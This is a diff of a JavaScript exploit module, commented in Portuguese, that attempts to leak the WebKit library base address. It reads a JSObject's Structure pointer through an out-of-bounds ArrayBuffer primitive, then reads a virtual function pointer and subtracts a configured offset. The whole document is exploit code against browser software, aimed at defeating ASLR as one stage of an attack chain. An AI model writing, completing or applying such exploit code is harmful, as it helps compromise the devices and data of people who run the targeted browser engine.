@@ -218,10 +218,9 @@ export async function attemptWebKitBaseLeakStrategy() {
     const FNAME_LEAK_RUNNER = "attemptWebKitBaseLeakStrategy";
     logS3(`--- Iniciando Estratégia de Vazamento de Endereço Base do WebKit (v2) ---`, "test", FNAME_LEAK_RUNNER);
 
-    // Verifica se os offsets necessários estão no config.mjs
     if (!JSC_OFFSETS.JSCell || !JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET ||
         !JSC_OFFSETS.Structure || !JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET ||
-        !WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS || !WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]) { // Exemplo de função alvo
+        !WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS || !WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]) {
         logS3("ERRO: Offsets críticos para vazamento de base não definidos em config.mjs.", "critical", FNAME_LEAK_RUNNER);
         logS3("   Necessário: JSCell.STRUCTURE_POINTER_OFFSET, Structure.VIRTUAL_PUT_OFFSET, e uma função alvo em WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS (ex: 'JSC::JSObject::put').", "critical", FNAME_LEAK_RUNNER);
         return;
@@ -235,22 +234,16 @@ export async function attemptWebKitBaseLeakStrategy() {
         logS3("Ambiente OOB inicializado para tentativa de vazamento de base.", "info", FNAME_LEAK_RUNNER);
 
         // --- PASSO 1: Identificar (ou posicionar) um JSObject e obter seu endereço ---
-        // Esta é a parte mais crítica e específica do exploit.
-        // Você precisa de uma maneira de saber o endereço de um JSObject (ou qualquer objeto JSCell)
-        // que esteja acessível através do seu oob_array_buffer_real.
-        // O valor abaixo é um EXEMPLO e DEVE SER SUBSTITUÍDO pela sua lógica de localização de objeto.
+        // Este valor é um EXEMPLO e DEVE SER SUBSTITUÍDO pela sua lógica de localização de objeto.
         const HYPOTHETICAL_OFFSET_TO_JSOBJECT = 0x2000; // EXEMPLO! Mude isso!
-        // Este offset é relativo ao início do oob_array_buffer_real.
-        // Se o seu oob_array_buffer_real *é* o objeto ou sobrepõe o objeto, o offset pode ser pequeno ou 0.
 
         logS3(`PASSO 1: Tentando usar um JSObject hipotético no offset ${toHex(HYPOTHETICAL_OFFSET_TO_JSOBJECT)} do oob_buffer.`, "info", FNAME_LEAK_RUNNER);
         logS3(`   Lembre-se: Este offset (${toHex(HYPOTHETICAL_OFFSET_TO_JSOBJECT)}) é um EXEMPLO e precisa ser determinado pelo seu exploit.`, "warn", FNAME_LEAK_RUNNER);
-        logS3(`   Formas de obter este offset: heap spraying, corrupção de metadados para criar sobreposição, etc.`, "info", FNAME_LEAK_RUNNER);
 
         // --- PASSO 2: Ler o ponteiro Structure* do JSObject ---
-        // O ponteiro Structure* está em JSObject (JSCell) + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET
-        const structure_ptr_field_addr = HYPOTHETICAL_OFFSET_TO_JSOBJECT + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET;
-        logS3(`PASSO 2: Lendo o Structure* do campo em ${toHex(HYPOTHETICAL_OFFSET_TO_JSOBJECT)} + ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET)} = ${toHex(structure_ptr_field_addr)}.`, "info", FNAME_LEAK_RUNNER);
+        const address_of_jsobject_for_struct_ptr = HYPOTHETICAL_OFFSET_TO_JSOBJECT;
+        const structure_ptr_field_addr = address_of_jsobject_for_struct_ptr + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET;
+        logS3(`PASSO 2: Lendo o Structure* do campo em ${toHex(address_of_jsobject_for_struct_ptr)} + ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET)} = ${toHex(structure_ptr_field_addr)}.`, "info", FNAME_LEAK_RUNNER);
 
         let structure_obj_ptr_adv64;
         try {
@@ -265,41 +258,33 @@ export async function attemptWebKitBaseLeakStrategy() {
             throw e;
         }
         
-        // NOTA: O structure_obj_ptr_adv64 pode ser um "tagged pointer" em algumas arquiteturas/versões.
-        // Para este exemplo, vamos assumir que ele pode ser usado diretamente como endereço (a parte baixa).
-        // Em um exploit real, você pode precisar aplicar uma máscara para remover a tag.
-        // Ex: const structure_obj_address = structure_obj_ptr_adv64.low() & ADDRESS_MASK; (se fosse um ponteiro de 32 bits taggeado em um QWORD)
-        // Para ponteiros de 64 bits, a tag é geralmente nos bits mais altos, ou não existe para ponteiros diretos.
-        // Vamos usar .low() e .high() para formar o endereço, mas se for um ponteiro compactado, isso muda.
-        // Por simplicidade, vamos assumir que structure_obj_ptr_adv64.toNumber() ou uma combinação de low/high é o endereço.
-        // O mais seguro é usar o objeto AdvancedInt64 se as primitivas de leitura esperam isso.
-        // Para oob_read_absolute, o primeiro argumento é um NÚMERO de offset.
-        // Se structure_obj_ptr_adv64 é um ponteiro para uma área FORA do oob_array_buffer_real, esta estratégia precisa de uma primitiva de LEITURA ARBITRÁRIA,
-        // não apenas OOB dentro do buffer. O código atual de oob_read_absolute opera DENTRO dos limites do oob_dataview_real.
-        // Se structure_obj_ptr_adv64 for um endereço absoluto, precisaremos de addrof/fakeobj para lê-lo.
-        // **ASSUMINDO PARA ESTE EXEMPLO que structure_obj_ptr_adv64 é um offset DENTRO do oob_array_buffer_real para o objeto Structure.**
-        // Esta é uma suposição forte e provavelmente incorreta para um ponteiro real.
-        // Se for um ponteiro real (absoluto), o código de oob_read_absolute precisaria ser adaptado ou uma primitiva de leitura arbitrária real seria necessária.
-        //
-        // MUDANÇA DE LÓGICA: Se structure_obj_ptr_adv64 é um ponteiro *absoluto* e queremos ler dele,
-        // precisaríamos de uma primitiva addrof() e fakeobj() para ler de endereços arbitrários,
-        // OU que o objeto Structure esteja *também* dentro da nossa janela OOB.
-        // Vamos continuar com a suposição que o *valor* de structure_obj_ptr_adv64 é um offset válido para oob_read_absolute.
-        // Esta é a maior fonte de falha se o HYPOTHETICAL_OFFSET_TO_JSOBJECT não for ajustado para que Structure também caia na área OOB.
-
-        const structure_obj_address_for_read = structure_obj_ptr_adv64.toNumber(); // CUIDADO: Perda de precisão para endereços > 2^53
-                                                                          // E o mais importante: Isso assume que o ponteiro é um offset dentro da nossa área OOB.
-                                                                          // Se for um ponteiro absoluto, esta linha está conceitualmente errada para oob_read_absolute.
+        // IMPORTANTE: O valor de structure_obj_ptr_adv64 é o ENDEREÇO do objeto Structure.
+        // Para ler DENTRO do objeto Structure usando oob_read_absolute, este endereço PRECISA ser um offset
+        // válido DENTRO do seu oob_array_buffer_real. Se for um ponteiro absoluto para fora do buffer,
+        // oob_read_absolute (como está implementado) não funcionará.
+        // Você precisaria de uma primitiva de leitura arbitrária (addr_read) para ler de endereços absolutos.
+        // Para este exemplo, VAMOS ASSUMIR que o objeto Structure está magicamente localizado em um offset
+        // dentro do oob_array_buffer_real que corresponde ao valor numérico do ponteiro Structure* lido.
+        // Esta é uma suposição MUITO FORTE e irrealista sem uma primitiva addrof + leitura arbitrária.
+        // Em um exploit real, você usaria addrof(obj_structure) se pudesse, ou teria que posicionar o obj_structure
+        // em um local conhecido dentro da sua janela OOB.
+        let structure_obj_address_for_read;
+        if (structure_obj_ptr_adv64.high() !== 0) { // Heurística muito simples para ponteiro "real" vs offset pequeno
+            logS3(`   AVISO: Structure* ${structure_obj_ptr_adv64.toString(true)} parece um ponteiro absoluto. A leitura de VIRTUAL_PUT_OFFSET pode falhar se não tivermos leitura arbitrária ou se Structure não estiver em OOB.`, "warn", FNAME_LEAK_RUNNER);
+            // Para fins de demonstração, se for um ponteiro "grande", não tentaremos usá-lo como offset OOB direto.
+            // Em um exploit real, aqui você usaria sua primitiva de leitura arbitrária baseada no valor de structure_obj_ptr_adv64.
+            // Ou, se você pulverizou Structures, você procuraria uma Structure em um offset conhecido.
+            // Por enquanto, vamos lançar um erro se parecer um ponteiro absoluto para forçar o ajuste do HYPOTHETICAL_OFFSET.
+             throw new Error("Structure* parece ser um ponteiro absoluto, necessita de leitura arbitrária ou melhor posicionamento.");
+        } else {
+            // Se high for 0, tratamos low como um offset dentro do oob_array_buffer_real.
+            structure_obj_address_for_read = structure_obj_ptr_adv64.low();
+        }
         
         logS3(`   Endereço do objeto Structure (para leitura, assumido como offset OOB): ${toHex(structure_obj_address_for_read, 64)}`, "info", FNAME_LEAK_RUNNER);
-        if (structure_obj_address_for_read > oob_array_buffer_real.byteLength - JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET - 8) {
-             logS3(`   AVISO: O endereço do Structure ${toHex(structure_obj_address_for_read, 64)} mais o offset VIRTUAL_PUT está provavelmente fora da área OOB!`, "warn", FNAME_LEAK_RUNNER);
-             // Poderia lançar um erro aqui ou tentar prosseguir com cautela.
-        }
 
 
         // --- PASSO 3: Ler o ponteiro da função virtual (ex: put) de Structure ---
-        // Este ponteiro está em Structure + JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET
         const virtual_put_func_ptr_field_addr = structure_obj_address_for_read + JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET;
         logS3(`PASSO 3: Lendo o ponteiro da função virtual (ex: put) de Structure em ${toHex(structure_obj_address_for_read,64)} + ${toHex(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET)} = ${toHex(virtual_put_func_ptr_field_addr,64)}.`, "info", FNAME_LEAK_RUNNER);
 
@@ -318,7 +303,7 @@ export async function attemptWebKitBaseLeakStrategy() {
 
         // --- PASSO 4: Calcular o endereço base do WebKit ---
         // Assumimos que o VIRTUAL_PUT_OFFSET aponta para uma função como JSC::JSObject::put.
-        const targetFunctionName = "JSC::JSObject::put"; // Verifique se este é o alvo correto para VIRTUAL_PUT_OFFSET
+        const targetFunctionName = "JSC::JSObject::put"; // Ou qualquer outra função que VIRTUAL_PUT_OFFSET possa apontar e que esteja no config.
         const offset_of_target_function_str = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS[targetFunctionName];
 
         if (!offset_of_target_function_str) {
